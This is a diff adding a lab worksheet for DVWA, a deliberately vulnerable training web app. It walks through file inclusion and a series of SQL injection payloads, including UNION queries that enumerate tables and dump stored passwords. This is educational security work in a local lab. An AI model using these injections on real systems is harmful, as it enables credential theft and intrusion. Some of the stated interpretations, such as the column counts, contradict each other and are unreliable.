@@ -1,0 +1,106 @@
+A.Hack a website by Remote File Inclusion
+1.Install XAMPP 
+
+Enter mysql –u root
+
+Download DVWA-master.zip
+
+
+
+Install DVWA in C:\xampp\htdocs
+
+
+Goto C:\xampp\htdocs\DVWA-master\config. Change the file name config.inc.php.dist to config.inc.php
+
+
+
+In the browser ,  enter http://localhost/dvwa-master/setup.php . Scroll below to find:
+
+
+
+Next , it opens the window below: http://localhost/DVWA-master/login.php
+
+
+
+Enter default credentials username =admin and password=password
+
+We are now logged into DVWA
+
+
+Local file inclusion and Remote file inclusion
+
+What is DVWA?
+PHP/MySQL web application that is vulnerable. 
+Main goals:
+oTo be an aid for security professionals to test their skills and tools in a legal environment.
+oHelp web developers better understand the processes of securing web applications.
+oAid teachers/students to teach/learn web application security in a class room environment.
+
+a.A website attack named Remote file inclusion is basically a one of the most common vulnerability found in web application. This type of vulnerability allows the Hacker or attacker to add a remote file on the web server. If the attacker gets successful in performing the attack he/she will gain access to the web server and hence can execute any command on it.
+
+Questions:
+Create a login.php/registration.php for your website. Perform local file inclusion using DVWA.
+
+
+
+
+
+2.Perform remote file inclusion using DVWA . Display the home page of www.google.com
+On the address bar, set page attribute to http://www.google.com
+
+
+SQL injection testing using DVWA
+1.create the above login_user table in dvwa database.
+2.Goto dvwa. Set the security to low. Select  SQL Injection. Perform the following commands in the    User ID Textbox. Display the outputs and interpret your results:
+
+User ID 1 has firstname as admin and password admin.
+
+
+User ID 1 has firstname as Gordon and password Brown.
+
+Find out how many columns are there in the table.
+User ID = 1’ order by 1#. Name the columns in the table.
+Output:
+
+
+The Columns In the table are ID, firstname and surname.
+
+User ID = 1’ order by 3#
+Output :
+
+
+
+Unknown column 3. It means there is no 3rd column. Only 2 columns exist in the table.
+
+What is the output and interpret.
+
+1' or '1'='1
+
+
+
+Displays all the records from the table.
+
+1' UNION select user, password from users
+
+
+
+Displays the all columns of the record with id as 1
+
+User ID= 1' union select user(), database()
+
+
+
+User ID= 1' union select null, user()
+
+
+
+User ID= 1' union select null, database()
+
+
+
+User ID =1' union select null, table_name from iformation_schema.tables
+
+
+
+User ID =  1' union select null, concat(id, 0x0a,name, 0x0a ,user_name, 0x0a ,password) from login_user
+
